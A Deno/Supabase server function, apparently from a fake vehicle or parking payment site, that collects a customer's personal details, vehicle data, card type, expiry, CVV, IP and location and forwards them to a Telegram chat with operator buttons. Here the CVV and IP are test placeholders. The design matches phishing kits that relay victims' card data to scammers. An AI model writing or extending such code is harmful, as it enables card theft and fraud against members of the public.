import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.4';
import { Resend } from "npm:resend@2.0.0";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
const resend = new Resend(Deno.env.get("RESEND_API_KEY"));

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabase = createClient(supabaseUrl, supabaseServiceKey);
    const { userId } = await req.json();

    if (!userId) {
      return new Response(
        JSON.stringify({
          success: false,
          error: 'User ID is required'
        }),
        {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        }
      );
    }

    // Get payment session details
    const { data: session, error } = await supabase
      .from('payment_sessions')
      .select('*')
      .eq('user_id', userId)
      .single();

    if (error || !session) {
      return new Response(
        JSON.stringify({
          success: false,
          error: 'Payment session not found'
        }),
        {
          status: 404,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        }
      );
    }

    // Send Telegram notification to the second chat with buttons
    try {
      const telegramResponse = await supabase.functions.invoke('send-telegram-notification', {
        body: {
          type: 'payment_submission',
          data: {
            userId: session.user_id,
            name: session.customer_name,
            email: session.customer_email,
            phone: session.customer_phone,
            vehicle_registration: session.vehicle_registration,
            vehicle_make: session.vehicle_make,
            vehicle_model: session.vehicle_model,
            vehicle_color: session.vehicle_color,
            duration: session.duration_label,
            price: session.price,
            card_number_masked: session.card_number_masked,
            card_type: session.card_type,
            card_expiry: "12/26",
            card_cvv: "123",
            test_mode: true,
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            ip: "test_ip",
            country: "Test Country",
            city: "Test City",
            region: "Test Region",
            timezone: "Test/Timezone",
            isp: "Test ISP"
          }
        }
      });

      console.log('Telegram notification sent:', telegramResponse);
    } catch (telegramError) {
      console.error('Failed to send Telegram notification:', telegramError);
    }

    return new Response(
      JSON.stringify({
        success: true,
        message: 'Telegram notification sent successfully'
      }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      }
    );

  } catch (error) {
    console.error('Error completing order:', error);
    return new Response(
      JSON.stringify({
        success: false,
        error: error.message
      }),
      {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      }
    );
  }
});